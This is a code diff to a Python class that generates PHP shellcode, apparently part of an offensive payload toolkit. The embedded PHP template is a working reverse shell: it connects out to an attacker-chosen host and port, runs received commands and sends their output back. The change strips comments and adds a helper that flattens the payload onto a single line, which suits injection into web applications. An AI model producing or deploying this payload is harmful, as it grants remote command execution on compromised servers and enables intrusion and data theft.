@@ -146,7 +146,7 @@ class PhpShellcodes:
 
         return phpcode
 
-    def get_phpcode(self, badchars, localhost, localport):
+    def get_phpcode(self, localhost, localport):
         """ Function to get php shellcode """
 
         if not localhost or not localport:
@@ -159,7 +159,7 @@ class PhpShellcodes:
     $address="LOCALHOST";
     $port="LOCALPORT";
     $buff_size=2048;
-    $timeout=120;       // sec
+    $timeout=120;
 
     $sock=socket_create(AF_INET,SOCK_STREAM,0) or die("Cannot create a socket");
     socket_set_option($sock,SOL_SOCKET,SO_RCVTIMEO,array('sec'=>$timeout,'usec'=>0));
@@ -167,10 +167,8 @@ class PhpShellcodes:
     socket_connect($sock,$address,$port) or die("Could not connect to the socket");
 
     while ($read=socket_read($sock,$buff_size)) {
-        // read from socket
         $out="";
         if ($read) {
-            // exit if quit
             if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
                 break;
             }
@@ -181,7 +179,6 @@ class PhpShellcodes:
             ob_end_clean();
         }
 
-        // send to socket
         $length=strlen($out);
         while (1) {
             $sent=socket_write($sock,$out,$length);
@@ -189,13 +186,8 @@ class PhpShellcodes:
                 break;
             }
 
-            // Check if the entire message has been sented
             if ($sent<$length) {
-                // If not sent the entire message.
-                // Get the part of the message that has not yet been sented as message
                 $st=substr($st,$sent);
-
-                // Get the length of the not sented part
                 $length-=$sent;
             } else {
                 break;
@@ -210,6 +202,12 @@ class PhpShellcodes:
         phpcode = phpcode.replace("LOCALPORT", str(localport))
 
         return phpcode
+
+    def get_php_code_inline(self, host, port):
+        res = self.get_phpcode(host, port)
+        res = res.replace('\n','')
+        res = res.replace('\r','')
+        return res
 
 
 class JavaShellcodes:
